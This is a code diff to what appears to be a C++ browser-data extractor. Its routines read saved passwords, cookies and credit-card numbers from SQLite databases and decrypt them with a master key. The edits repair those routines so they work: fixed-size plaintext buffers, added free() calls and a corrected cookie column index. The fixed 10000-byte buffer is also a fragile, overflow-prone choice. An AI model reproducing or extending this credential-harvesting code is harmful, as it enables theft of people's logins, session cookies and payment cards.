@@ -178,7 +178,7 @@ public:
             std::vector<unsigned char> key_bytes;
             utils::conversion::string_to_byte_vector(master_key, key_bytes);
 
-            unsigned char *plaintext = (unsigned char *)malloc(password.length() + 1);
+            unsigned char *plaintext = (unsigned char *)malloc(10000);
 
             password_data data;
             data.action_url = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0));
@@ -193,6 +193,8 @@ public:
             data.password_value = decrypted_pass;
 
             result.push_back(data);
+            
+            free(plaintext);
         }
 
         sqlite3_finalize(stmt);
@@ -209,7 +211,7 @@ public:
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             const unsigned char *url = sqlite3_column_text(stmt, 0);
             const unsigned char *name = sqlite3_column_text(stmt, 1);
-            const unsigned char *ciphertext = sqlite3_column_text(stmt, 2);
+            const unsigned char *ciphertext = sqlite3_column_text(stmt, 3);
 
             std::string password;
             std::string tag;
@@ -229,7 +231,7 @@ public:
             std::vector<unsigned char> key_bytes;
             utils::conversion::string_to_byte_vector(master_key, key_bytes);
 
-            unsigned char *plaintext = (unsigned char *)malloc(password.length() + 1);
+            unsigned char *plaintext = (unsigned char *)malloc(10000);
 
             cookie_data data;
             data.action_url = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0));
@@ -244,6 +246,8 @@ public:
             data.value = decrypted_pass;
 
             result.push_back(data);
+
+            free(plaintext);
         }
 
         sqlite3_finalize(stmt);
@@ -302,7 +306,7 @@ public:
             std::vector<unsigned char> key_bytes;
             utils::conversion::string_to_byte_vector(master_key, key_bytes);
 
-            unsigned char *plaintext = (unsigned char *)malloc(password.length() + 1);
+            unsigned char *plaintext = (unsigned char *)malloc(10000);
 
             creditc_data data;
             data.name_on_card = std::string(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0)));
@@ -318,6 +322,8 @@ public:
             data.card_number = decrypted_number;
 
             result.push_back(data);
+
+            free(plaintext);
         }
 
         sqlite3_finalize(stmt);
